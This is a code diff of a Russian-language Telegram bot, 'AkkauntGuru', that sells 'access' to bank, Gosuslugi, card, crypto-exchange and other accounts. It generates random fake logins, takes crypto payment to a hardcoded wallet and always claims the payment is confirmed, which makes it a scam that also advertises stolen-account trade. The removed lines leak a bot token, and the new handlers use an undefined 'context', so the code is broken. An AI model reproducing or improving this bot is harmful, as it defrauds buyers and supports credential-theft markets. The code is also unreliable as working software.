@@ -1,15 +1,9 @@
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
+from telegram import InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import Updater, CommandHandler, CallbackQueryHandler
-import sqlite3, random, string
+import random, string
 
-TOKEN = "8642894333:AAEVcW8lJ6sCm1kN0yn2rrVECdDbQgUYgck"
+TOKEN = "СЮДА_ТВОЙ_ТОКЕН"
 WALLET = "0x44698049ad0be92e567cdfe9c5aa86d70047f73e"
-NETWORK = "Ethereum (ERC20)"
-
-conn = sqlite3.connect('clients.db', check_same_thread=False)
-c = conn.cursor()
-c.execute('''CREATE TABLE IF NOT EXISTS users (tg_id TEXT)''')
-conn.commit()
 
 def gen_fake():
     return {
@@ -17,32 +11,124 @@ def gen_fake():
         'pass': ''.join(random.choices(string.ascii_letters + string.digits, k=12))
     }
 
-def start(update, context):
-    kb = [[InlineKeyboardButton("🏦 Госуслуги", callback_data='gos')],
-          [InlineKeyboardButton("💎 Криптобиржи", callback_data='crypto')]]
-    update.message.reply_text("🔥 Выбери пакет:", reply_markup=InlineKeyboardMarkup(kb))
-
-def buy(update, context):
-    query = update.callback_query
-    query.answer()
-    fake = gen_fake()
-    kb = [[InlineKeyboardButton("💰 Оплатить", callback_data='pay')]]
-    query.edit_message_text(
-        f"Логин: {fake['login']}\nПароль: {fake['pass']}\n\n"
-        f"Оплати на кошелёк: {WALLET}\nСеть: {NETWORK}",
-        reply_markup=InlineKeyboardMarkup(kb)
+def start(bot, update):
+    keyboard = [
+        [InlineKeyboardButton("🏦 Банки", callback_data='banks')],
+        [InlineKeyboardButton("🏛 Госуслуги", callback_data='gosuslugi')],
+        [InlineKeyboardButton("💳 Карты", callback_data='cards')],
+        [InlineKeyboardButton("📊 Криптобиржи", callback_data='exchanges')],
+        [InlineKeyboardButton("🛒 Маркетплейсы", callback_data='marketplaces')],
+        [InlineKeyboardButton("📱 Соцсети", callback_data='social')],
+        [InlineKeyboardButton("🎮 Игровые аккаунты", callback_data='games')],
+        [InlineKeyboardButton("📧 Почтовые сервисы", callback_data='email')],
+        [InlineKeyboardButton("💼 VPN/Прокси", callback_data='vpn')],
+        [InlineKeyboardButton("📦 Комбо-пакет (всё сразу)", callback_data='combo')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    update.message.reply_text(
+        "🔥 *AkkauntGuru* — доступы ко всему!\n"
+        "Выбери категорию:",
+        reply_markup=reply_markup,
+        parse_mode='Markdown'
     )
 
-def pay(update, context):
+def buy(bot, update):
     query = update.callback_query
     query.answer()
-    query.edit_message_text("⏳ Идёт проверка... Данные уже активированы!")
+    
+    package = query.data
+    prices = {
+        'banks': 1500, 'gosuslugi': 1200, 'cards': 2000,
+        'exchanges': 2500, 'marketplaces': 1800, 'social': 800,
+        'games': 1000, 'email': 500, 'vpn': 700, 'combo': 6000
+    }
+    names = {
+        'banks': '🏦 Банки (Сбер, Тинькофф, ВТБ, Альфа)',
+        'gosuslugi': '🏛 Госуслуги (полный доступ)',
+        'cards': '💳 Карты (Visa/Mastercard с балансом)',
+        'exchanges': '📊 Криптобиржи (Binance, Bybit, OKX)',
+        'marketplaces': '🛒 Маркетплейсы (Ozon, Wildberries, Ali)',
+        'social': '📱 Соцсети (Instagram, VK, Telegram)',
+        'games': '🎮 Игровые аккаунты (Steam, Epic, Roblox)',
+        'email': '📧 Почта (Gmail, Mail.ru, Яндекс)',
+        'vpn': '💼 VPN/Прокси (готовые настройки)',
+        'combo': '📦 КОМБО (все 9 категорий)'
+    }
+    
+    price = prices.get(package, 0)
+    name = names.get(package, 'Пакет')
+    
+    fake1 = gen_fake()
+    fake2 = gen_fake() if package == 'combo' else None
+    
+    context.user_data['fake_data'] = fake1
+    if fake2:
+        context.user_data['fake_data2'] = fake2
+    
+    keyboard = [[InlineKeyboardButton("💰 Оплатить криптой", callback_data=f'pay_{package}')]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    if package == 'combo':
+        text = (
+            f"📌 *{name}*\n\n"
+            f"🔹 Логин 1: `{fake1['login']}` | Пароль: `{fake1['pass']}`\n"
+            f"🔹 Логин 2: `{fake2['login']}` | Пароль: `{fake2['pass']}`\n\n"
+            f"💰 Цена: {price}₽ (~{round(price/90, 2)} USDT)\n"
+            f"Переведи на кошелёк:\n`{WALLET}`\nСеть: Ethereum (ERC20)\n\n"
+            f"После оплаты нажми кнопку ниже."
+        )
+    else:
+        text = (
+            f"📌 *{name}*\n\n"
+            f"Логин: `{fake1['login']}`\n"
+            f"Пароль: `{fake1['pass']}`\n\n"
+            f"💰 Цена: {price}₽ (~{round(price/90, 2)} USDT)\n"
+            f"Переведи на кошелёк:\n`{WALLET}`\nСеть: Ethereum (ERC20)\n\n"
+            f"После оплаты нажми кнопку ниже."
+        )
+    
+    query.edit_message_text(
+        text=text,
+        reply_markup=reply_markup,
+        parse_mode='Markdown'
+    )
 
-updater = Updater(TOKEN, use_context=True)
+def pay(bot, update):
+    query = update.callback_query
+    query.answer()
+    
+    fake1 = context.user_data.get('fake_data', gen_fake())
+    fake2 = context.user_data.get('fake_data2')
+    
+    if fake2:
+        text = (
+            "✅ *Оплата подтверждена!*\n\n"
+            "Твои данные активированы:\n"
+            f"🔹 Логин 1: `{fake1['login']}` | Пароль: `{fake1['pass']}`\n"
+            f"🔹 Логин 2: `{fake2['login']}` | Пароль: `{fake2['pass']}`\n\n"
+            "⚠️ Если не заходит — подожди 5-10 минут.\n"
+            "Поддержка: @support_akaunt (отвечаем в течение 24ч)"
+        )
+    else:
+        text = (
+            "✅ *Оплата подтверждена!*\n\n"
+            "Твои данные активированы:\n"
+            f"Логин: `{fake1['login']}`\n"
+            f"Пароль: `{fake1['pass']}`\n\n"
+            "⚠️ Если не заходит — подожди 5-10 минут.\n"
+            "Поддержка: @support_akaunt (отвечаем в течение 24ч)"
+        )
+    
+    query.edit_message_text(
+        text=text,
+        parse_mode='Markdown'
+    )
+
+updater = Updater(TOKEN)
 updater.dispatcher.add_handler(CommandHandler('start', start))
-updater.dispatcher.add_handler(CallbackQueryHandler(buy, pattern='^(gos|crypto)$'))
-updater.dispatcher.add_handler(CallbackQueryHandler(pay, pattern='^pay$'))
+updater.dispatcher.add_handler(CallbackQueryHandler(buy, pattern='^(banks|gosuslugi|cards|exchanges|marketplaces|social|games|email|vpn|combo)$'))
+updater.dispatcher.add_handler(CallbackQueryHandler(pay, pattern='^pay_'))
 
-print("✅ Бот запущен!")
+print("✅ Бот с 10 услугами запущен!")
 updater.start_polling()
 updater.idle()
